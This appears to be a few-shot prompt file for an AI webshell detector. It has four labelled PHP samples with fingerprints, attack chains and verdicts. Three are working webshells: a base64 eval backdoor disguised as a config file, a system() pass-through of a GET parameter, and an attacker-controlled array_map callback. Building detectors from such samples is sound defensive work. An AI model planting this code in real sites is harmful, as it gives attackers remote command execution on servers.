# PHP Webshell — Few-Shot Examples

Use these examples for in-context learning. **Always select the example whose behavioral fingerprint most closely matches the target file** (mirroring BFAD's WBFP).

---

## Example 1: Classic Encoded One-Liner

### Code
```php
<?php
/**
 * Database configuration file
 * DO NOT EDIT
 */
$config = $_POST['config'];
$decoded = base64_decode($config);
eval($decoded);
?>
```

### Behavioral Fingerprint
- [x] Input Channel: `$_POST`
- [x] Obfuscation & Encryption: `base64_decode`
- [x] Code Execution: `eval`
- [ ] Program Execution
- [ ] Network Communication
- [ ] Information Gathering
- [ ] Callback Functions

### Attack Chain
`$_POST['config']` → `base64_decode()` → `eval()`

### Verdict: **WebShell**
### Confidence: **99**
### Key Evidence
- Complete 3-layer chain: input (POST) → transform (base64_decode) → execute (eval)
- The comment "Database configuration file" is a social-engineering clue — no actual DB config exists
- Direct eval of user input with no validation or sanitization

---

## Example 2: System Command Execution

### Code
```php
<?php
$action = $_GET['action'];
if ($action == 'check') {
    system('uptime');
} elseif ($action == 'clean') {
    system('rm -rf /tmp/cache/*');
} else {
    $cmd = $_GET['cmd'];
    system($cmd);
}
?>
```

### Behavioral Fingerprint
- [x] Input Channel: `$_GET`
- [x] Program Execution: `system`
- [ ] Code Execution
- [ ] Obfuscation & Encryption
- [ ] Network Communication
- [ ] Information Gathering

### Attack Chain
`$_GET['cmd']` → `system()`

### Verdict: **WebShell**
### Confidence: **98**
### Key Evidence
- Direct pass-through from user input to system command
- The `else` branch accepts arbitrary `cmd` parameter
- No command whitelist or input validation on `cmd`

---

## Example 3: WordPress Template Renderer (Benign — but uses eval)

### Code
```php
<?php
// WordPress core: wp-includes/template.php (simplified)
function wp_render_template($template_path) {
    if (!file_exists($template_path)) {
        return false;
    }
    if (!current_user_can('administrator')) {
        return false;
    }
    $template_content = file_get_contents($template_path);
    // Render PHP template
    eval('?>' . $template_content);
}
```

### Behavioral Fingerprint
- [ ] Input Channel: (no direct user input to eval — path comes from admin-controlled file system)
- [ ] Obfuscation & Encryption
- [x] Code Execution: `eval`
- [ ] Program Execution
- [ ] Network Communication
- [ ] Information Gathering

### Attack Chain
**No complete chain.** The eval input comes from `file_get_contents($template_path)`, not from user input. There are access control checks (`current_user_can`). Only one layer (Code Execution) is present.

### Verdict: **Benign**
### Confidence: **85**
### Key Evidence
- Uses `eval` but input comes from file system, not user input
- Authorization check before execution
- Single function category triggered (Code Execution only), not multi-layer chain
- Belongs to a known legitimate codebase (WordPress core)

---

## Example 4: Callback-Based Obfuscated Webshell

### Code
```php
<?php
$items = $_POST['items'];
$operations = $_POST['ops'];

// Split operations into function names
$funcs = explode(',', $operations);

// Apply each function to items via array_map
foreach ($funcs as $func) {
    $items = array_map($func, $items);
}

// Output results
print_r($items);
?>
```

### Behavioral Fingerprint
- [x] Input Channel: `$_POST`
- [x] Callback Functions: `array_map`
- [ ] Code Execution
- [ ] Program Execution
- [ ] Obfuscation & Encryption
- [ ] Network Communication
- [ ] Information Gathering

### Attack Chain
`$_POST['ops']` → `explode()` → `array_map($func, $items)` where `$func` is attacker-controlled

If attacker sends `ops=system` and `items=["whoami"]`, this executes `system("whoami")`.

### Verdict: **WebShell**
### Confidence: **92**
### Key Evidence
- Function names come directly from user input (`$_POST['ops']`)
- `array_map` with attacker-controlled function name = indirect execution
- No function name whitelist or validation
